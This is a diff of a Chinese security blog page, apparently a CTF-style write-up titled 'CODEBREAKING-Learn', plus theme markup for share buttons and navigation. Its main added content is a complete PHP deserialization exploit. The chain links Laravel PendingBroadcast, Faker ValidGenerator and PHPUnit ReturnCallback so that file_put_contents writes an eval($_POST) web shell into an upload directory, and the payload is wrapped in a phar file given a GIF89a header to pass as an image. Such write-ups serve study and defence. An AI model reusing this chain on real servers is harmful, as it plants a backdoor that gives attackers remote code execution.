class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>返回这个类，最后通过<code>ValidGenerator</code>中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, $res));</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$<span class="title">this</span>-&gt;<span class="title">events</span> = <span class="title">new</span> \<span class="title">Faker</span>\<span class="title">ValidGenerator</span>();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;event = <span class="string">'yhbl'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$this-&gt;parameters = array('/var/www/html/upload/k.php','&lt;?php phpinfo();eval($_POST["k"]);?&gt;');</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$this-&gt;callback = 'file_put_contents';</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">ValidGenerator</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$<span class="title">si</span> = <span class="title">new</span> \<span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>\<span class="title">StaticInvocation</span>();      <span class="comment">//最后赋值给$res</span></span><br><span class="line">			$g2 = <span class="keyword">new</span> \Faker\Generator(<span class="keyword">array</span>(<span class="string">'yhbl'</span> =&gt; $si ));</span><br><span class="line">			$g1 = <span class="keyword">new</span> \Faker\Generator(<span class="keyword">array</span>(<span class="string">"dispatch"</span> =&gt; <span class="keyword">array</span>($g1, <span class="string">"getFormatter"</span>)));</span><br><span class="line"></span><br><span class="line">			$rc = <span class="keyword">new</span> \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&gt;validator = <span class="keyword">array</span>($rc, <span class="string">"invoke"</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;generator = $g1;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10000</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($form)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$<span class="title">exp</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// phar</span></span><br><span class="line">	$p = <span class="keyword">new</span> Phar(<span class="string">'./k.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -187,75 +285,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/08/CODEBREAKING-Learn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/08/Linux-learn-指令篇/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux_learn_指令篇</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/19/ECShopSQL注入漏洞分析/" class="archive-article-date">
-  	<time datetime="2018-10-19T13:21:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-19</time>
-</a>
-        </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/19/ECShopSQL注入漏洞分析/">ECShopSQL注入漏洞分析</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码执行</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -278,9 +407,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
